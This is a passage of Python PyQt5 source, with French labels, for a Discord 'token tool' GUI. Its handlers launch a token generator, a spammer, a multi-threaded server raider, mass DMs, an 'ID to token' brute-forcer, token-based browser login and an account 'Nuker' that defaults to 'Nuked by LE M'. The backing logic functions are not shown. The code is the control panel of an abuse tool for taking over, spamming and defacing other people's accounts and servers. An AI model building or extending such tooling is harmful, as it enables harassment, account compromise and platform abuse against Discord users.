        self.btn_lang.clicked.connect(self.action_cycle_lang)
        self.btn_theme.clicked.connect(self.action_cycle_theme)
        self.btn_status.clicked.connect(self.action_cycle_status)
        
        # Navigation
        btn_menu_server.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(1))
        btn_menu_raid.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(2))
        btn_menu_profile.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(3))
        btn_menu_friends.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(4))
        btn_menu_utils.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(5))
        btn_back_server.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(0))
        btn_back_raid.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(0))
        btn_back_profile.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(0))
        btn_back_friends.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(0))
        btn_back_utils.clicked.connect(lambda: self.stacked_widget.setCurrentIndex(0))

        scroll_area.setWidget(self.stacked_widget)
        left_layout.addWidget(scroll_area)

        self.btn_clear = QPushButton("🧹  Effacer Console")
        self.btn_clear.setObjectName("ClearBtn")
        self.btn_clear.setCursor(Qt.PointingHandCursor)
        self.btn_clear.clicked.connect(self.clear_logs)
        left_layout.addWidget(self.btn_clear)

        btn_back = QPushButton("⬅️  Retour")
        btn_back.setObjectName("ExitBtn")
        btn_back.setCursor(Qt.PointingHandCursor)
        btn_back.clicked.connect(self.close)
        left_layout.addWidget(btn_back)

        # --- Right Panel ---
        right_panel = QWidget()
        right_panel.setObjectName("RightPanel")
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.setSpacing(0)

        header_frame = QFrame()
        header_frame.setObjectName("HeaderFrame")
        header_frame.setFixedHeight(50)
        header_layout = QHBoxLayout(header_frame)
        term_label = QLabel("SORTIE TERMINAL")
        term_label.setObjectName("HeaderLabel")
        header_layout.addWidget(term_label)
        header_layout.addStretch()
        right_layout.addWidget(header_frame)

        self.console = QTextEdit()
        self.console.setReadOnly(True)
        right_layout.addWidget(self.console)

        self.status_bar = QFrame()
        self.status_bar.setObjectName("StatusBar")
        self.status_bar.setFixedHeight(30)
        status_layout = QHBoxLayout(self.status_bar)
        status_layout.setContentsMargins(10, 0, 10, 0)
        
        self.status_label = QLabel("Système Prêt")
        self.status_label.setObjectName("StatusLabel")
        status_layout.addWidget(self.status_label)
        
        right_layout.addWidget(self.status_bar)

        content_layout.addWidget(left_panel)
        content_layout.addWidget(right_panel)
        self.main_layout.addLayout(content_layout)

        self.apply_styles()

        self.setWindowOpacity(0)
        self.anim = QPropertyAnimation(self, b"windowOpacity")
        self.anim.setDuration(500)
        self.anim.setStartValue(0)
        self.anim.setEndValue(1)
        self.anim.setEasingCurve(QEasingCurve.OutQuad)
        self.anim.start()

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.oldPos = event.globalPos()

    def mouseMoveEvent(self, event):
        if event.buttons() == Qt.LeftButton:
            delta = QPoint(event.globalPos() - self.oldPos)
            self.move(self.x() + delta.x(), self.y() + delta.y())
            self.oldPos = event.globalPos()

    def apply_styles(self):
        self.setStyleSheet("""
            QMainWindow { background-color: transparent; }
            QFrame#MainContainer { background-color: #09090b; border: 1px solid #27272a; border-radius: 12px; }
            QFrame#SidePanel { background-color: #101012; border-right: 1px solid #27272a; border-bottom-left-radius: 12px; }
            QFrame#HeaderFrame { background-color: #101012; border-bottom: 1px solid #27272a; }
            QFrame#TitleBar { background-color: #101012; border-bottom: 1px solid #27272a; border-top-left-radius: 12px; border-top-right-radius: 12px; }
            QLabel#TitleLabel { color: #71717a; font-family: 'Consolas'; font-weight: bold; font-size: 12px; }
            QPushButton#TitleBtn, QPushButton#TitleBtnClose { background-color: transparent; border: none; color: #71717a; font-weight: bold; font-size: 14px; padding: 0; }
            QPushButton#TitleBtn:hover { color: #fff; }
            QPushButton#TitleBtnClose:hover { color: #ef4444; }
            QLabel#HeaderLabel { color: #71717a; font-weight: bold; letter-spacing: 1px; padding-left: 10px; }
            QFrame#StatusBar { background-color: #101012; border-top: 1px solid #27272a; border-bottom-right-radius: 12px; }
            QLabel#StatusLabel { color: #52525b; font-size: 12px; }
            QLineEdit { background-color: #27272a; border: 1px solid #27272a; border-radius: 8px; padding: 12px; color: #f4f4f5; font-family: 'Consolas', monospace; font-size: 14px; }
            QLineEdit:focus { border: 1px solid #6366f1; background-color: #202023; }
            QPushButton { background-color: #18181b; border: 1px solid #27272a; border-radius: 8px; padding: 12px 20px; color: #e4e4e7; font-weight: 600; text-align: left; }
            QPushButton:hover { background-color: #27272a; border-color: #3f3f46; color: #ffffff; }
            QPushButton:pressed { background-color: #3f3f46; }
            QPushButton#ActionBtn { background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #4f46e5, stop:1 #7c3aed); border: 1px solid #6366f1; color: #ffffff; text-align: center; }
            QPushButton#ActionBtn:hover { background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #4338ca, stop:1 #6d28d9); border: 1px solid #818cf8; }
            QPushButton#ExitBtn { background-color: #18181b; border: 1px solid #ef4444; color: #ef4444; text-align: center; }
            QPushButton#ExitBtn:hover { background-color: #ef4444; color: #fff; }
            QPushButton#ClearBtn { text-align: center; }
            QPushButton#FolderBtn { text-align: center; padding: 0; }
            QTextEdit { background-color: #000000; border: none; color: #22c55e; font-family: 'Consolas', 'Courier New', monospace; font-size: 13px; padding: 20px; line-height: 1.5; border-bottom-right-radius: 12px; }
            QLabel#MenuLabel { font-size: 16px; font-weight: 800; color: #6366f1; padding: 10px 0; letter-spacing: 1px; }
            QScrollBar:vertical { border: none; background: #101012; width: 8px; margin: 0px; }
            QScrollBar::handle:vertical { background: #3f3f46; min-height: 20px; border-radius: 4px; }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0px; }
        """)

    def log_message(self, message):
        self.console.append(message)
        sb = self.console.verticalScrollBar()
        sb.setValue(sb.maximum())

    def clear_logs(self):
        self.console.clear()

    def open_token_file(self):
        if not os.path.exists('input'):
            os.makedirs('input')
        if not os.path.exists('input/token.txt') or os.path.getsize('input/token.txt') == 0:
            with open('input/token.txt', 'w') as f:
                f.write("MTAw...\nOTk...\n# Mettez vos tokens ici, un par ligne")
        
        try:
            if os.name == 'nt':
                os.startfile(os.path.abspath('input/token.txt'))
            else:
                subprocess.call(['xdg-open', 'input/token.txt'])
        except Exception as e:
            self.log_message(f"<font color='#ef4444'>[-] Erreur ouverture fichier: {e}</font>")

    def start_task(self, func, *args):
        if self.worker and self.worker.isRunning():
            self.log_message("<font color='#ef4444'>[-] Une tâche est déjà en cours.</font>")
            return

        self.status_label.setText("Traitement en cours...")
        self.worker = Worker(func, *args)
        self.worker.log_signal.connect(self.log_message)
        self.worker.finished_signal.connect(self.task_finished)
        self.worker.start()

    def task_finished(self):
        self.status_label.setText("Système Prêt")
        self.log_message("<font color='#3f3f46'>----------------------------------------</font>")

    # --- Action Handlers (Inputs) ---

    def action_generator(self):
        count, ok = QInputDialog.getInt(self, "Générateur", "Nombre de tokens à générer:", 10, 1, 1000)
        if ok:
            self.start_task(logic_generator, count)

    def action_joiner(self):
        invite, ok = QInputDialog.getText(self, "Rejoindre", "Lien d'invitation Discord:")
        if ok and invite:
            self.start_task(logic_joiner, self.token_input.text(), invite)

    def action_spammer(self):
        target, ok = QInputDialog.getText(self, "Spammer", "ID Cible (Utilisateur/Salon):")
        if ok and target:
            msg, ok2 = QInputDialog.getText(self, "Spammer", "Message:")
            if ok2 and msg:
                count, ok3 = QInputDialog.getInt(self, "Spammer", "Nombre de messages:", 5, 1, 100)
                if ok3:
                    self.start_task(logic_spammer, self.token_input.text(), target, msg, count)

    def action_server_raid(self):
        channels, ok = QInputDialog.getMultiLineText(self, "Server Raid", "IDs des Salons (un par ligne):")
        if ok and channels:
            msg, ok2 = QInputDialog.getText(self, "Server Raid", "Message de Spam:")
            if ok2 and msg:
                threads, ok3 = QInputDialog.getInt(self, "Server Raid", "Nombre de Threads:", 4, 1, 50)
                if ok3:
                    self.start_task(logic_server_raid, self.token_input.text(), channels, msg, threads)

    def action_selenium_login(self):
        token = self.token_input.text().strip()
        if not token:
            QMessageBox.warning(self, "Erreur", "Veuillez entrer un token dans le champ principal.")
            return
        browser, ok = QInputDialog.getItem(self, "Navigateur", "Choisir le navigateur:", ["Chrome", "Edge", "Firefox"], 0, False)
        if ok and browser:
            self.start_task(logic_selenium_login, token, browser)

    def action_massdm(self):
        msg, ok = QInputDialog.getText(self, "Mass DM", "Message à envoyer à tous les DMs ouverts:")
        if ok and msg:
            self.start_task(logic_mass_dm, self.token_input.text(), msg)

    def action_brute(self):
        uid, ok = QInputDialog.getText(self, "ID vers Token", "ID de l'utilisateur:")
        if ok and uid:
            self.start_task(logic_bruteforce_id, uid)

    def action_nuker(self):
        config = {}
        
        # 1. Mass DM
        reply = QMessageBox.question(self, 'Nuker', 'Voulez-vous envoyer un Mass DM ?', QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            msg, ok = QInputDialog.getText(self, "Nuker", "Message Mass DM :")
            if ok: config['mass_dm'] = msg
        
        # 2. Server Name
        s_name, ok = QInputDialog.getText(self, "Nuker", "Nom des serveurs à créer :", text="Nuked by LE M")
        if ok: config['server_name'] = s_name
        else: return

        # 3. Status / Global Name
        stat, ok = QInputDialog.getText(self, "Nuker", "Texte Statut / Nom Global :", text="Nuked")
        if ok: config['status_text'] = stat
        else: return

        # 4. Bio
        bio, ok = QInputDialog.getText(self, "Nuker", "Texte de la Bio :", text="Account Nuked")
        if ok: config['bio_text'] = bio
        else: return
        
        self.start_task(logic_nuker, self.token_input.text(), config)

    def action_hypesquad(self):
        items = ["1 - Bravery", "2 - Brilliance", "3 - Balance"]
        item, ok = QInputDialog.getItem(self, "HypeSquad", "Choisir la Maison :", items, 0, False)
        if ok and item:
            choice = item.split(' ')[0]
            self.start_task(logic_hypesquad, self.token_input.text(), choice)

    def action_cycle_lang(self):
        count, ok = QInputDialog.getInt(self, "Cycle Langue", "Nombre de cycles :", 10, 1, 1000)
        if ok:
            self.start_task(logic_cycle_language, self.token_input.text(), count)

    def action_cycle_theme(self):
        count, ok = QInputDialog.getInt(self, "Cycle Thème", "Nombre de cycles :", 10, 1, 1000)
        if ok:
            self.start_task(logic_cycle_theme, self.token_input.text(), count)

    def action_cycle_status(self):
        text, ok = QInputDialog.getMultiLineText(self, "Cycle Statut", "Entrez les statuts (un par ligne) :")
        if ok and text:
            statuses = [s.strip() for s in text.split('\n') if s.strip()]
            if statuses:
                self.start_task(logic_cycle_status, self.token_input.text(), statuses)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = TokenToolWindow()
    window.show()
    sys.exit(app.exec_())